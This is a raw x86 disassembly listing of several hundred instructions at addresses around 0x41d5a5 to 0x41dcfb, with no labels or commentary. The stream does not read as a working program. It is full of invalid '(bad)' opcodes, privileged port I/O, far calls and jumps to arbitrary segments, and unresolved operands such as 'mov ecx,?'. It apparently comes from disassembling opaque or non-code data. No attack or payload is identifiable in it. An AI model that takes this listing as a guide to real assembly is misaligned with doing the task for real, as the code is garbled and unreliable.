  41d5a5:	cwde   
  41d5a6:	pop    esp
  41d5a7:	sub    bl,BYTE PTR [edx+0x4]
  41d5aa:	dec    ebx
  41d5ab:	mov    al,ds:0x6a2bf7c7
  41d5b0:	and    eax,0xc72e3233
  41d5b5:	mov    edx,DWORD PTR [edx-0x20]
  41d5b8:	jmp    0x41d55a
  41d5ba:	push   edi
  41d5bb:	loopne 0x41d571
  41d5bd:	and    al,0x93
  41d5bf:	test   eax,0xa5d28e64
  41d5c4:	sub    BYTE PTR [edx+0x3920ec3b],bh
  41d5ca:	enter  0xa94d,0x4
  41d5ce:	or     ebp,DWORD PTR [edx]
  41d5d0:	pushf  
  41d5d1:	out    0x6c,al
  41d5d3:	ror    edx,1
  41d5d5:	outs   dx,DWORD PTR ds:[esi]
  41d5d6:	loop   0x41d60a
  41d5d8:	jg     0x41d5a6
  41d5da:	push   ebx
  41d5db:	imul   edx,esp,0x9961ee75
  41d5e1:	jge    0x41d5f6
  41d5e3:	aam    0x19
  41d5e5:	aaa    
  41d5e6:	inc    ebx
  41d5e7:	pop    eax
  41d5e8:	enter  0x2a4,0xdb
  41d5ec:	add    ebp,DWORD PTR [ebx]
  41d5ee:	test   al,0x88
  41d5f0:	xchg   edi,eax
  41d5f1:	gs call 0xa896:0xee42ce9d
  41d5f9:	jns    0x41d60d
  41d5fb:	fcomp  DWORD PTR [ebp+0x2d]
  41d5fe:	xchg   esi,eax
  41d5ff:	cmp    al,0xa9
  41d601:	jnp    0x41d5c3
  41d603:	test   BYTE PTR [ecx+esi*2+0x432b1509],bl
  41d60a:	addr16 daa 
  41d60c:	add    DWORD PTR [eax+0x6c],0x68
  41d610:	sahf   
  41d611:	mov    bh,0x44
  41d613:	dec    ebx
  41d614:	outs   dx,DWORD PTR ds:[esi]
  41d615:	repnz dec ebp
  41d617:	jmp    0x41d5d4
  41d619:	mov    ds:0xc5132ba6,eax
  41d61e:	addr16 jg 0x41d66e
  41d621:	mov    ds:0xbbfe831c,al
  41d626:	out    dx,eax
  41d627:	retf   
  41d628:	stc    
  41d629:	add    eax,0xe24ed802
  41d62e:	mov    al,0x44
  41d630:	ftst   
  41d632:	stc    
  41d633:	mov    ebp,0xe4e6eb91
  41d638:	cmc    
  41d639:	repz neg DWORD PTR [ecx]
  41d63c:	and    edx,DWORD PTR [ecx+0x20abfd48]
  41d642:	pop    es
  41d643:	in     al,dx
  41d644:	jbe    0x41d6b3
  41d646:	jae    0x41d68b
  41d648:	jmp    0x36fdf4cb
  41d64d:	jns    0x41d5eb
  41d64f:	pop    ebp
  41d650:	enter  0x291a,0x5f
  41d654:	inc    edi
  41d655:	dec    eax
  41d656:	daa    
  41d657:	loopne 0x41d5d9
  41d659:	ins    DWORD PTR es:[edi],dx
  41d65a:	(bad)  
  41d65b:	xor    eax,0xbd0e8231
  41d660:	adc    ebp,DWORD PTR [ebp+0x11972418]
  41d666:	inc    ebp
  41d667:	dec    edx
  41d668:	loope  0x41d653
  41d66a:	fldcw  WORD PTR [eax-0x4005af61]
  41d670:	push   eax
  41d671:	mov    ecx,0xa94f892a
  41d676:	lea    ebx,[ebp-0x477975f]
  41d67c:	jp     0x41d602
  41d67e:	sahf   
  41d67f:	rcl    BYTE PTR [eax+0x64],0x6d
  41d683:	xchg   ebp,eax
  41d684:	loopne 0x41d655
  41d686:	pop    ss
  41d687:	cmp    bl,BYTE PTR [ecx-0x7a36c2f]
  41d68d:	push   ebx
  41d68e:	sbb    dl,BYTE PTR [ebx+0x3a]
  41d691:	pop    ds
  41d692:	outs   dx,BYTE PTR ds:[esi]
  41d693:	mov    ds:0xc3c96feb,eax
  41d698:	mov    ds:0x8840891f,eax
  41d69d:	out    dx,eax
  41d69e:	adc    BYTE PTR [ecx+esi*1-0x25e1d066],ah
  41d6a5:	mov    bh,BYTE PTR [eax+0x36]
  41d6a8:	add    DWORD PTR [ecx-0x2de80a94],0xf32b4bb1
  41d6b2:	retf   
  41d6b3:	test   eax,0xd511c2f
  41d6b8:	jg     0x41d668
  41d6ba:	test   dh,dl
  41d6bc:	cmp    al,0xd7
  41d6be:	inc    esp
  41d6bf:	loope  0x41d70a
  41d6c1:	lock lods eax,DWORD PTR ss:[esi]
  41d6c4:	jmp    0x41d6e6
  41d6c6:	mov    al,ds:0x2c0bcc10
  41d6cb:	nop
  41d6cc:	or     ebx,DWORD PTR [esi]
  41d6ce:	lds    ecx,FWORD PTR [edx-0x64da3ea4]
  41d6d4:	dec    eax
  41d6d5:	cmp    BYTE PTR [ebp-0x515a7e2b],ch
  41d6db:	stos   DWORD PTR es:[edi],eax
  41d6dc:	jp     0x41d6b1
  41d6de:	pop    esp
  41d6df:	ret    
  41d6e0:	scas   al,BYTE PTR es:[edi]
  41d6e1:	call   0xe9b09a45
  41d6e6:	ret    0x7060
  41d6e9:	nop
  41d6ea:	aas    
  41d6eb:	xchg   ecx,eax
  41d6ec:	cld    
  41d6ed:	mov    dh,0x17
  41d6ef:	add    DWORD PTR [edx],edi
  41d6f1:	mov    dl,0xa9
  41d6f3:	cmp    al,0x4
  41d6f5:	push   cs
  41d6f6:	mov    edx,0x2419bdd2
  41d6fb:	ins    DWORD PTR es:[edi],dx
  41d6fc:	adc    DWORD PTR [edx-0x3ad4d658],ebx
  41d702:	dec    edx
  41d703:	mov    ds:0x8c76974,al
  41d708:	push   ds
  41d709:	(bad)  
  41d70a:	loopne 0x41d70e
  41d70c:	popa   
  41d70d:	pop    edx
  41d70e:	dec    DWORD PTR [esp+edx*2+0x1c867612]
  41d715:	ret    0x95c7
  41d718:	lea    ebx,[edi]
  41d71a:	xchg   edx,eax
  41d71b:	dec    ecx
  41d71c:	(bad)  
  41d71e:	push   esi
  41d71f:	fiadd  DWORD PTR [ecx-0x13]
  41d722:	scas   al,BYTE PTR es:[edi]
  41d723:	in     eax,dx
  41d724:	out    0xb8,eax
  41d726:	(bad)  
  41d727:	and    BYTE PTR [esi-0x4f],dl
  41d72a:	(bad)  
  41d72b:	rcl    ah,cl
  41d72d:	xchg   ebx,eax
  41d72e:	lea    esp,[ebp+edx*2-0x5]
  41d732:	pop    ss
  41d733:	pop    ss
  41d734:	clc    
  41d735:	jmp    0x41d708
  41d737:	sub    ah,dh
  41d739:	inc    edx
  41d73a:	leave  
  41d73b:	pusha  
  41d73c:	mov    ebx,0x3415845
  41d741:	(bad)  
  41d742:	jo     0x41d711
  41d744:	inc    ebp
  41d745:	fist   WORD PTR [ebx]
  41d747:	test   bl,bl
  41d749:	and    DWORD PTR [edx-0x44],edi
  41d74c:	shl    BYTE PTR [eax-0x29316ae3],1
  41d752:	shl    DWORD PTR [eax+0x57],0xf9
  41d756:	fwait
  41d757:	sar    al,1
  41d759:	fbstp  TBYTE PTR [esi-0x117f5614]
  41d75f:	(bad)  
  41d760:	int    0xeb
  41d762:	(bad)  
  41d763:	and    eax,0xa4914bd
  41d768:	ins    DWORD PTR es:[edi],dx
  41d769:	pop    ss
  41d76a:	and    BYTE PTR [edi+eax*4+0x69],bl
  41d76e:	pop    edi
  41d76f:	inc    ebx
  41d770:	pop    ecx
  41d771:	inc    ecx
  41d772:	imul   esi
  41d774:	dec    edi
  41d775:	mov    dl,0xf8
  41d777:	scas   eax,DWORD PTR es:[edi]
  41d778:	or     eax,0x91d8f71f
  41d77d:	sub    BYTE PTR [ebp-0x57f62a0],ch
  41d783:	outs   dx,DWORD PTR ds:[esi]
  41d784:	in     eax,0x5a
  41d786:	sti    
  41d787:	loopne 0x41d7c4
  41d789:	ja     0x41d747
  41d78b:	std    
  41d78c:	daa    
  41d78d:	add    bh,BYTE PTR ds:0xd741810e
  41d793:	mov    ah,0x11
  41d795:	shl    BYTE PTR [ebx-0x4a],0xda
  41d799:	test   DWORD PTR [ebx+0x4],edx
  41d79c:	cs in  al,0x4b
  41d79f:	push   ds
  41d7a0:	in     eax,0x6d
  41d7a2:	fisttp WORD PTR [ecx]
  41d7a4:	adc    ch,BYTE PTR [ecx-0x57]
  41d7a7:	outs   dx,BYTE PTR ds:[esi]
  41d7a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7a9:	push   0x27743f99
  41d7ae:	adc    BYTE PTR [ebp+0x3c1b3dd7],dl
  41d7b4:	std    
  41d7b5:	sbb    ebp,DWORD PTR [esi]
  41d7b7:	and    al,0x4d
  41d7b9:	sub    cl,BYTE PTR [ebp-0x7d]
  41d7bc:	mov    DWORD PTR [esi],esi
  41d7be:	jge    0x41d7c1
  41d7c0:	xlat   BYTE PTR ds:[ebx]
  41d7c1:	pushf  
  41d7c2:	mov    eax,ds:0x6458af9c
  41d7c7:	mov    DWORD PTR [edi+0x4f],ecx
  41d7ca:	rcr    BYTE PTR [eiz*2-0x5b810b05],1
  41d7d1:	adc    BYTE PTR [esi+edx*4],0x36
  41d7d5:	fisttp QWORD PTR [ecx+0x57778a67]
  41d7db:	jp     0x41d783
  41d7dd:	mov    dh,0x8d
  41d7df:	cmp    BYTE PTR [ecx],ch
  41d7e1:	and    DWORD PTR [edi-0x19],eax
  41d7e4:	je     0x41d828
  41d7e6:	inc    ebp
  41d7e7:	inc    ebp
  41d7e8:	mov    bh,0xb6
  41d7ea:	push   edx
  41d7eb:	jo     0x41d7df
  41d7ed:	stos   DWORD PTR es:[edi],eax
  41d7ee:	loop   0x41d7bb
  41d7f0:	xchg   esp,eax
  41d7f1:	add    dl,BYTE PTR [edx]
  41d7f3:	rcr    BYTE PTR [edx+0x69],0xdd
  41d7f7:	loope  0x41d7ef
  41d7f9:	enter  0x6dc7,0xff
  41d7fd:	cmp    eax,0x8674a98a
  41d802:	daa    
  41d803:	push   ss
  41d804:	cmp    al,cl
  41d806:	lds    ebx,FWORD PTR [ebp-0x2a6403b]
  41d80c:	leave  
  41d80d:	xchg   esp,eax
  41d80e:	inc    esp
  41d80f:	sbb    ebp,DWORD PTR ds:0xba8ef8c7
  41d815:	cmp    al,0x2c
  41d817:	lahf   
  41d818:	inc    esi
  41d819:	ja     0x41d79c
  41d81b:	sub    esp,edi
  41d81d:	and    al,0xf4
  41d81f:	fadd   QWORD PTR [edx+edx*4-0x4e6cfd9]
  41d826:	scas   al,BYTE PTR es:[edi]
  41d827:	xor    eax,0xf9128766
  41d82c:	scas   eax,DWORD PTR es:[edi]
  41d82d:	popf   
  41d82e:	in     eax,dx
  41d82f:	mov    BYTE PTR [ecx+0x6970a721],ah
  41d835:	mov    bl,0xbc
  41d837:	retf   
  41d838:	call   0xe0ba:0x4912309d
  41d83f:	stos   BYTE PTR es:[edi],al
  41d840:	inc    ecx
  41d841:	inc    ebx
  41d842:	loop   0x41d8b7
  41d844:	imul   DWORD PTR [ecx]
  41d846:	inc    esi
  41d847:	sub    al,0xf8
  41d849:	sar    BYTE PTR [ebx-0x32],cl
  41d84c:	push   esi
  41d84d:	mov    edi,0x3d6922e1
  41d852:	mov    ch,0xdf
  41d854:	dec    eax
  41d855:	push   es
  41d856:	test   eax,0x3b744d4f
  41d85b:	xchg   esi,eax
  41d85c:	push   edx
  41d85d:	dec    ebx
  41d85e:	daa    
  41d85f:	and    edx,DWORD PTR [ebp-0x3e]
  41d862:	xchg   ebp,eax
  41d863:	shl    dh,1
  41d865:	test   BYTE PTR [edx],dl
  41d867:	in     al,dx
  41d868:	xlat   BYTE PTR ds:[ebx]
  41d869:	or     BYTE PTR [esi+0x2a4708f8],al
  41d86f:	mov    dh,0x69
  41d871:	cmp    al,0x4e
  41d873:	test   DWORD PTR [edx],ebx
  41d875:	push   esi
  41d876:	mov    eax,0xea38d061
  41d87b:	dec    ebp
  41d87c:	xor    DWORD PTR [eax],esi
  41d87e:	test   ecx,0x2520b9e8
  41d884:	pop    ecx
  41d885:	rol    edi,0x4c
  41d888:	mov    bh,dl
  41d88a:	enter  0xa947,0xbb
  41d88e:	add    eax,0xef9c520b
  41d893:	stos   BYTE PTR es:[edi],al
  41d894:	pusha  
  41d895:	mov    ebp,0x7d1fd850
  41d89a:	and    al,BYTE PTR [edx-0x60b4b399]
  41d8a0:	sbb    BYTE PTR [ebx],cl
  41d8a2:	pop    edi
  41d8a3:	icebp  
  41d8a4:	xor    edx,DWORD PTR [ebx]
  41d8a6:	cwde   
  41d8a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8a8:	cmp    edi,DWORD PTR [esi]
  41d8aa:	mov    BYTE PTR [edx+ebx*1-0x15],0x9
  41d8af:	mov    al,0x3e
  41d8b1:	sbb    bh,BYTE PTR [edx+eiz*8+0x5206bd23]
  41d8b8:	cs icebp 
  41d8ba:	push   esi
  41d8bb:	mov    bl,0x48
  41d8bd:	fisub  WORD PTR ds:0x57d6a5d2
  41d8c3:	loope  0x41d8ff
  41d8c5:	jne    0x41d8b3
  41d8c7:	pop    es
  41d8c8:	test   BYTE PTR [ecx-0x33],bl
  41d8cb:	mov    ds:0xdaf20573,al
  41d8d0:	call   FWORD PTR [edx]
  41d8d2:	fmul   DWORD PTR [eax-0x6c]
  41d8d5:	cmp    DWORD PTR [ecx-0x43170f08],0xe
  41d8dc:	out    0x80,eax
  41d8de:	jp     0x41d891
  41d8e0:	and    al,0x5a
  41d8e2:	dec    esp
  41d8e3:	inc    esp
  41d8e4:	xor    BYTE PTR [ecx],ch
  41d8e6:	push   0x6a
  41d8e8:	mov    ch,0xc0
  41d8ea:	jb     0x41d8b9
  41d8ec:	outs   dx,BYTE PTR ds:[esi]
  41d8ed:	icebp  
  41d8ee:	je     0x41d8b0
  41d8f0:	push   cs
  41d8f1:	xlat   BYTE PTR ds:[ebx]
  41d8f2:	mov    edi,0x7b1492d6
  41d8f7:	mov    ah,0xb9
  41d8f9:	jo     0x41d8f6
  41d8fb:	push   ds
  41d8fc:	iret   
  41d8fd:	ss fwait
  41d8ff:	loope  0x41d921
  41d901:	xor    ch,BYTE PTR [esi+0x2e]
  41d904:	arpl   WORD PTR [edx],sp
  41d906:	push   esp
  41d907:	(bad)  
  41d908:	das    
  41d909:	cmp    ebx,DWORD PTR [ebp+0x3d]
  41d90c:	clc    
  41d90d:	shr    cl,cl
  41d90f:	(bad)  
  41d910:	clc    
  41d911:	lods   al,BYTE PTR ds:[esi]
  41d912:	(bad)
  41d915:	cmp    al,0xc
  41d917:	push   eax
  41d918:	fild   DWORD PTR ds:0x4319e950
  41d91e:	js     0x41d963
  41d920:	adc    al,0x1c
  41d922:	shl    BYTE PTR [edi-0x43],1
  41d925:	enter  0xb596,0xa
  41d929:	dec    ebp
  41d92a:	out    dx,eax
  41d92b:	jle    0x41d975
  41d92d:	sbb    eax,0xd1ea6f3e
  41d932:	push   ecx
  41d933:	pop    ds
  41d934:	(bad)  
  41d935:	dec    ecx
  41d936:	pop    edi
  41d937:	pop    edx
  41d938:	sub    ch,BYTE PTR [ecx]
  41d93a:	lahf   
  41d93b:	test   al,0x89
  41d93d:	push   edi
  41d93e:	lods   eax,DWORD PTR ds:[esi]
  41d93f:	mov    bl,0x3d
  41d941:	push   ebx
  41d942:	into   
  41d943:	sub    eax,0x2a824624
  41d948:	imul   DWORD PTR [ebp+0x5d547cb4]
  41d94e:	jle    0x41d8f0
  41d950:	(bad)  
  41d951:	out    dx,al
  41d952:	jae    0x41d959
  41d954:	aad    0x42
  41d956:	inc    esi
  41d957:	not    BYTE PTR [edx]
  41d959:	loope  0x41d9bc
  41d95b:	mov    esi,0x4b074244
  41d960:	ins    DWORD PTR es:[edi],dx
  41d961:	dec    edi
  41d962:	jcxz   0x41d912
  41d965:	pop    edi
  41d966:	dec    edi
  41d967:	movhps QWORD PTR [edi+0x38344675],xmm3
  41d96e:	ror    edx,cl
  41d970:	repz mov eax,0x6cbc01c1
  41d976:	cdq    
  41d977:	add    dh,ah
  41d979:	cli    
  41d97a:	mov    ebx,0x47dc9759
  41d97f:	sub    DWORD PTR [eax-0x65],esp
  41d982:	jo     0x41d9b1
  41d984:	pop    ebp
  41d985:	ss test eax,0xac8b581
  41d98b:	lahf   
  41d98c:	pop    es
  41d98d:	(bad)  [esi+0x67c28b8]
  41d993:	sub    dh,0x67
  41d996:	or     eax,0xefd760ac
  41d99b:	mov    dl,0xd4
  41d99d:	mov    esi,0x1006b3aa
  41d9a2:	icebp  
  41d9a3:	ss push esp
  41d9a5:	fsubr  DWORD PTR [edi+0x4b1342ef]
  41d9ab:	adc    bh,BYTE PTR [ecx+0x6]
  41d9ae:	push   0xffffffad
  41d9b0:	and    cl,BYTE PTR [esi+0x1d53958d]
  41d9b6:	add    BYTE PTR [ecx+ecx*2-0x3d3479a9],ah
  41d9bd:	push   0x7e
  41d9bf:	xchg   esi,eax
  41d9c0:	jno    0x41da1f
  41d9c2:	nop
  41d9c3:	ret    
  41d9c4:	sbb    eax,0xa95282f9
  41d9c9:	dec    ebx
  41d9ca:	xor    BYTE PTR [ebp-0x41ddd427],al
  41d9d0:	addr16 mov edi,0xccdf7a0c
  41d9d6:	sub    eax,0x95a5a379
  41d9db:	jge    0x41da3d
  41d9dd:	pop    esi
  41d9de:	inc    edx
  41d9df:	hlt    
  41d9e0:	pminub mm0,QWORD PTR [edx-0x3e]
  41d9e4:	cld    
  41d9e5:	bound  esi,QWORD PTR [ebx]
  41d9e7:	jmp    0xea5a:0x3fe9a692
  41d9ee:	mov    ch,0xec
  41d9f0:	cmp    eax,0x44d56a42
  41d9f5:	adc    al,0xb9
  41d9f7:	pop    ds
  41d9f8:	div    BYTE PTR [eax]
  41d9fa:	(bad)  
  41d9fb:	xchg   edx,eax
  41d9fc:	retf   0xc18e
  41d9ff:	(bad)  
  41da00:	out    0xd8,eax
  41da02:	xlat   BYTE PTR ds:[ebx]
  41da03:	inc    eax
  41da04:	dec    edi
  41da05:	xor    eax,0xede75442
  41da0a:	aas    
  41da0b:	aam    0x3e
  41da0d:	daa    
  41da0e:	mul    BYTE PTR [ebx-0x70711619]
  41da14:	adc    ebp,0xffffffc3
  41da17:	adc    ch,cl
  41da19:	pop    edi
  41da1a:	jno    0x41da04
  41da1c:	xchg   edx,eax
  41da1d:	ror    bl,cl
  41da1f:	(bad)  
  41da20:	push   esi
  41da21:	gs cdq 
  41da23:	pop    es
  41da24:	ret    0x23e3
  41da27:	test   bl,cl
  41da29:	div    BYTE PTR [ecx-0x1a4efd41]
  41da2f:	push   eax
  41da30:	xchg   esi,eax
  41da31:	and    ebx,DWORD PTR [ebx*8-0x31089a16]
  41da38:	mov    bh,0x5c
  41da3a:	and    al,0xf8
  41da3c:	jmp    DWORD PTR [ebx+edx*8-0x72947d8a]
  41da43:	pop    esp
  41da44:	mov    cl,0x4a
  41da46:	mov    bl,0x9f
  41da48:	cmp    ebp,ebp
  41da4a:	pop    ebx
  41da4b:	push   edi
  41da4c:	dec    ecx
  41da4d:	jnp    0x41d9f5
  41da4f:	dec    edi
  41da50:	mov    dl,0xa9
  41da52:	jecxz  0x41da52
  41da54:	(bad)  
  41da55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da56:	push   edi
  41da57:	rcl    BYTE PTR [edi],cl
  41da59:	ds jmp 0x41d9dd
  41da5c:	bound  ecx,QWORD PTR [edi+0x1fa79a71]
  41da62:	std    
  41da63:	and    eax,0xf0d12c53
  41da68:	dec    edi
  41da69:	jp     0x41da20
  41da6b:	xor    BYTE PTR [esi-0x17],ch
  41da6e:	ror    bl,0xa
  41da71:	std    
  41da72:	cmp    al,0x9d
  41da74:	inc    edi
  41da75:	es int3 
  41da77:	sbb    dl,ah
  41da79:	aas    
  41da7a:	or     ecx,DWORD PTR [edx]
  41da7c:	mov    cl,BYTE PTR [ebp+0x58af58a8]
  41da82:	adc    eax,0xe1f7177a
  41da87:	vshufpd ymm3,ymm2,YMMWORD PTR [edi+0x611f9bbd],0x10
  41da90:	cmp    eax,0x91205dd5
  41da95:	or     DWORD PTR ds:0x1b19d12e,edx
  41da9b:	cmp    eax,0x282429c7
  41daa0:	cs dec esp
  41daa2:	sbb    dl,BYTE PTR [ebx+eiz*1+0x52ded03]
  41daa9:	icebp  
  41daaa:	sbb    BYTE PTR [esi+0x55],cl
  41daad:	out    0xb7,eax
  41daaf:	inc    edx
  41dab0:	xchg   ebp,eax
  41dab1:	aaa    
  41dab2:	neg    DWORD PTR [ebx]
  41dab4:	(bad)  
  41dab5:	cwde   
  41dab6:	dec    edi
  41dab7:	pop    edi
  41dab8:	mov    bl,0x62
  41daba:	lods   al,BYTE PTR ds:[esi]
  41dabb:	scas   al,BYTE PTR es:[edi]
  41dabc:	jl     0x41da50
  41dabe:	scas   eax,DWORD PTR es:[edi]
  41dabf:	sub    ah,BYTE PTR [ecx+eax*8-0x4675e1dd]
  41dac6:	mov    ecx,?
  41dac8:	push   ecx
  41dac9:	adc    ebx,DWORD PTR [bp+si+0x4869]
  41dace:	sub    BYTE PTR [ebx+esi*1-0x4254a04b],dh
  41dad5:	inc    edx
  41dad6:	dec    eax
  41dad7:	push   edi
  41dad8:	jmp    0x5411:0xec56fc1e
  41dadf:	fcmovnb st,st(7)
  41dae1:	hlt    
  41dae2:	dec    eax
  41dae3:	popa   
  41dae4:	dec    ecx
  41dae5:	cwde   
  41dae6:	retf   
  41dae7:	cmp    dh,BYTE PTR [ecx+0x2f47ee14]
  41daed:	pop    eax
  41daee:	loope  0x41da84
  41daf0:	out    dx,eax
  41daf1:	xor    bh,BYTE PTR [edi+ebp*8-0xa]
  41daf5:	dec    esp
  41daf6:	cdq    
  41daf7:	push   eax
  41daf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daf9:	scas   eax,DWORD PTR es:[edi]
  41dafa:	sub    ch,BYTE PTR [edi]
  41dafc:	in     al,dx
  41dafd:	mov    dl,0x98
  41daff:	les    ecx,FWORD PTR [esi-0x5a]
  41db02:	out    0x7c,eax
  41db04:	xor    BYTE PTR [esi-0x4b7b91f2],bl
  41db0a:	inc    eax
  41db0b:	ins    DWORD PTR es:[edi],dx
  41db0c:	push   cs
  41db0d:	fstp   QWORD PTR [ebx-0x64]
  41db10:	sbb    eax,0x29fc3ae8
  41db15:	test   ah,0x41
  41db18:	sub    al,0x67
  41db1a:	clc    
  41db1b:	dec    esp
  41db1c:	dec    esp
  41db1d:	mov    edx,0x49efddf3
  41db22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db23:	mov    ebx,0xd2bd3872
  41db28:	push   esp
  41db29:	mov    ds:0xf75583b3,eax
  41db2e:	cmc    
  41db2f:	mov    eax,ds:0x1ace2eca
  41db34:	or     DWORD PTR es:[edi],ebp
  41db37:	and    al,BYTE PTR [esi+0x241ed84]
  41db3d:	add    eax,0x933f5b90
  41db42:	sub    eax,0xe880d9be
  41db47:	and    al,BYTE PTR [edi]
  41db49:	fild   WORD PTR [edi]
  41db4b:	ret    
  41db4c:	mov    ecx,0xbcdcf2d
  41db51:	repnz xchg ebp,eax
  41db53:	scas   eax,DWORD PTR es:[edi]
  41db54:	jle    0x41db1a
  41db56:	add    DWORD PTR [ebx+0xe],ebx
  41db59:	pop    ebx
  41db5a:	cdq    
  41db5b:	scas   eax,DWORD PTR es:[edi]
  41db5c:	mov    fs,WORD PTR [ecx]
  41db5e:	out    0x5f,eax
  41db60:	sahf   
  41db61:	push   ebp
  41db62:	inc    edx
  41db63:	pop    ss
  41db64:	cmp    dl,bl
  41db66:	imul   ebp,DWORD PTR [edx+0x47],0x11
  41db6a:	loope  0x41db9b
  41db6c:	push   0x5b96d2be
  41db71:	mov    ds:0x687fcf24,eax
  41db76:	sti    
  41db77:	jae    0x41dba1
  41db79:	sahf   
  41db7a:	in     al,dx
  41db7b:	add    eax,0x3bc3295f
  41db80:	xor    BYTE PTR [edx],0xb2
  41db83:	xor    eax,0xb341a122
  41db88:	retf   
  41db89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db8a:	mov    ?,ecx
  41db8c:	cwde   
  41db8d:	stos   BYTE PTR es:[edi],al
  41db8e:	lahf   
  41db8f:	add    DWORD PTR [esi],ecx
  41db91:	cli    
  41db92:	pop    es
  41db93:	sbb    DWORD PTR [ecx+esi*8],ecx
  41db96:	sbb    edi,DWORD PTR [ecx+0x10c0836c]
  41db9c:	mov    esp,0xcb726123
  41dba1:	ss pop eax
  41dba3:	mov    edi,0x15c9e59d
  41dba8:	adc    edi,ebx
  41dbaa:	adc    al,BYTE PTR [edx]
  41dbac:	jle    0x41dc10
  41dbae:	push   esp
  41dbaf:	jmp    0x2bae5d55
  41dbb4:	sub    eax,0x2d975d59
  41dbb9:	jb     0x41dc27
  41dbbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbbc:	add    al,0x62
  41dbbe:	add    cl,ch
  41dbc0:	gs xchg ebx,eax
  41dbc2:	push   edi
  41dbc3:	call   0xa11d:0x56771320
  41dbca:	les    esi,FWORD PTR [edi+0xb77c6e1]
  41dbd0:	daa    
  41dbd1:	das    
  41dbd2:	cld    
  41dbd3:	mov    ds,WORD PTR [ebx-0x772e16d5]
  41dbd9:	xchg   esp,eax
  41dbda:	push   edi
  41dbdb:	mov    edx,0xbd389ed2
  41dbe0:	inc    ebp
  41dbe1:	call   0xcc83:0xb1255566
  41dbe8:	mov    ds:0xaaeea173,al
  41dbed:	das    
  41dbee:	pop    esi
  41dbef:	(bad)  
  41dbf0:	je     0x41dc33
  41dbf2:	popa   
  41dbf3:	in     al,0xd0
  41dbf5:	sbb    eax,0x61f4d08b
  41dbfa:	fiadd  WORD PTR [ebp+0x23]
  41dbfd:	adc    BYTE PTR [edi-0x5f],bh
  41dc00:	(bad)  
  41dc01:	pop    ds
  41dc02:	push   esp
  41dc03:	add    ebx,esp
  41dc05:	lea    ebx,[eax]
  41dc07:	xlat   BYTE PTR ds:[ebx]
  41dc08:	xchg   ecx,eax
  41dc09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc0a:	add    BYTE PTR [edx],cl
  41dc0c:	push   edx
  41dc0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc0e:	pop    ebp
  41dc0f:	add    dl,BYTE PTR [ebp-0x265b4db4]
  41dc15:	jp     0x41dbdd
  41dc17:	jge    0x41dc46
  41dc19:	ret    0x8ade
  41dc1c:	repz int 0x2c
  41dc1f:	push   es
  41dc20:	jne    0x41dc11
  41dc22:	push   0x41c7048f
  41dc27:	sbb    DWORD PTR [esi-0x63],0xadaad6aa
  41dc2e:	shl    BYTE PTR [esi+0x7851f1d9],cl
  41dc34:	mov    al,0xfa
  41dc36:	fcom   st(3)
  41dc38:	pop    eax
  41dc39:	lds    esi,FWORD PTR [edi-0x2a]
  41dc3c:	fwait
  41dc3d:	punpckhwd mm4,mm2
  41dc40:	stos   BYTE PTR es:[edi],al
  41dc41:	scas   eax,DWORD PTR es:[edi]
  41dc42:	loope  0x41dc9e
  41dc44:	ret    
  41dc45:	int    0xd9
  41dc47:	mov    edx,DWORD PTR [esi+0x34]
  41dc4a:	adc    DWORD PTR [edi-0x15],edi
  41dc4d:	inc    ebp
  41dc4e:	or     BYTE PTR [esi],dl
  41dc50:	push   edx
  41dc51:	pop    ebp
  41dc52:	sbb    DWORD PTR [edx],edx
  41dc54:	out    dx,al
  41dc55:	scas   eax,DWORD PTR es:[edi]
  41dc56:	xchg   ebx,ebp
  41dc58:	pop    ebx
  41dc59:	mov    dl,0x4a
  41dc5b:	xchg   ebp,eax
  41dc5c:	jns    0x41dcb0
  41dc5e:	inc    ebp
  41dc5f:	and    BYTE PTR [ebx],cl
  41dc61:	adc    al,0xbe
  41dc63:	shr    BYTE PTR [eax-0x6a1b96f4],cl
  41dc69:	out    0xed,al
  41dc6b:	jo     0x41dc60
  41dc6d:	std    
  41dc6e:	jge    0x41dc24
  41dc70:	aam    0x34
  41dc72:	xchg   edx,eax
  41dc73:	call   0x68c3:0xe1b613d7
  41dc7a:	mov    dl,0x69
  41dc7c:	es xchg ecx,eax
  41dc7e:	jo     0x41dc41
  41dc80:	hlt    
  41dc81:	mov    eax,ds:0xc1dbd785
  41dc86:	mov    ds:0x63792b8b,eax
  41dc8b:	mov    cl,0x86
  41dc8d:	mov    edi,0xcddd2949
  41dc92:	push   edi
  41dc93:	adc    ch,bl
  41dc95:	std    
  41dc96:	(bad)
  41dc99:	(bad)  
  41dc9a:	popa   
  41dc9b:	jne    0x41dccc
  41dc9d:	fmul   DWORD PTR [edi+0x0]
  41dca0:	aad    0x1d
  41dca2:	mov    ebx,0x3debf69e
  41dca7:	rcl    DWORD PTR [edi+0x2381b1dc],0xa
  41dcae:	sti    
  41dcaf:	fmul   st(5),st
  41dcb1:	push   esi
  41dcb2:	pop    edx
  41dcb3:	stos   BYTE PTR es:[edi],al
  41dcb4:	add    eax,0xb2868f7f
  41dcb9:	into   
  41dcba:	jno    0x41dd09
  41dcbc:	sub    BYTE PTR [ebx+0x1d059b08],al
  41dcc2:	test   al,0x78
  41dcc4:	ss pusha 
  41dcc6:	sub    cl,BYTE PTR [edx-0x8a60c0f]
  41dccc:	inc    edi
  41dccd:	and    DWORD PTR [eax+0x14],ebx
  41dcd0:	retf   0xa641
  41dcd3:	icebp  
  41dcd4:	dec    eax
  41dcd5:	mov    WORD PTR ds:0x9e82d867,ds
  41dcdb:	loop   0x41dce9
  41dcdd:	sbb    eax,0x2cdab962
  41dce2:	sar    BYTE PTR [ecx+0x20],cl
  41dce5:	mov    ds:0x94d952ca,eax
  41dcea:	mov    bh,dl
  41dcec:	pop    edi
  41dced:	push   ds
  41dcee:	scas   al,BYTE PTR es:[di]
  41dcf0:	enter  0xac9a,0xb7
  41dcf4:	add    bh,0x2a
  41dcf7:	inc    ebp
  41dcf8:	lds    esi,FWORD PTR [edi+0x35]
  41dcfb:	(bad)  
